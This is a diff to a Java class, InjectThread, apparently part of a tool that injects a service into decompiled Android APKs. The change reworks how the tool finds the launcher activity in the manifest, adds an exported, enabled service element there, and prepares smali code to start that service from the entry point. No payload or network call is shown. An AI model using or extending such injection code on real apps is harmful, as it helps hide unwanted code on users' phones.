@@ -13,7 +13,7 @@ public class InjectThread extends Thread {
     private String manifestContent, androidPackageName, epFilePath, smaliPackageName,
             serviceElement, newSmaliFileContent, epSmaliFileContent, onCreateLine,
             serviceStarterSmali, onCreateMethod, oldMethod, permissions, manifestTag,
-            androidPermissions, androidPackage, onCreateFunc;
+            androidPermissions, androidPackage, onCreateFunc, manifestMatcherResult;
     private Matcher manifestMatcher, manifestTagMatcher, androidPackageMatcher, onCreateMatcher;
     private int onCreateLineNum;
     private Constants constants = new Constants();
@@ -44,8 +44,11 @@ public class InjectThread extends Thread {
                         inj.printLog("Trying to find EntryPoint smali...");
                         manifestContent = inj.readFile(manifestFile.getPath()).replace("\n", "").replace("\r", "");
                         manifestMatcher = constants.manifestPattern1.matcher(manifestContent);
-                        if (manifestMatcher.find()){
-                            androidPackageName = manifestMatcher.group(0).replaceAll("<activity(.+?)android:name=\"", "")
+                        androidPackageName = "";
+                        manifestMatcherResult = "";
+                        while (manifestMatcher.find()){
+                            manifestMatcherResult = manifestMatcher.group();
+                            androidPackageName = manifestMatcher.group().replaceAll("<activity(.+?)android:name=\"", "")
                                     .replaceAll("\"(.+?)<intent-filter>(.+?)+", "");
                         }
                         androidPackage = "";
@@ -53,7 +56,7 @@ public class InjectThread extends Thread {
                         while (androidPackageMatcher.find()){
                             androidPackage = androidPackageMatcher.group().replace("package=\"", "").replace("\"", "");
                         }
-                        if(!androidPackageName.contains(androidPackage)){
+                        if(androidPackageName.split("[.]").length<3){
                             androidPackageName = androidPackage + "." +androidPackageName;
                         }
                         inj.printLog("EntryPoint smali: " + androidPackageName);
@@ -70,7 +73,7 @@ public class InjectThread extends Thread {
                         smaliPackageName = androidPackageName.replace("."+ androidPackageName.split("[.]")[androidPackageName.split("[.]").length-1], "") + "." +
                                 inj.getFilenameWithoutExtension(smaliFile.getName());
                         serviceElement = "<service android:enabled=\"true\" android:exported=\"true\" android:name=\""+ smaliPackageName + "\"/>";
-                        if(!inj.writeFile(manifestFile.getPath(), manifestContent.replace(manifestMatcher.group(0), manifestMatcher.group(0)+serviceElement))){
+                        if(!inj.writeFile(manifestFile.getPath(), manifestContent.replace(manifestMatcherResult, manifestMatcherResult+serviceElement))){
                             throw new FileOperationException(constants.FILE_WRITE_ERROR);}
                         /*Copy smali and edit package*/
                         inj.printLog("Moving and changing smali file...");
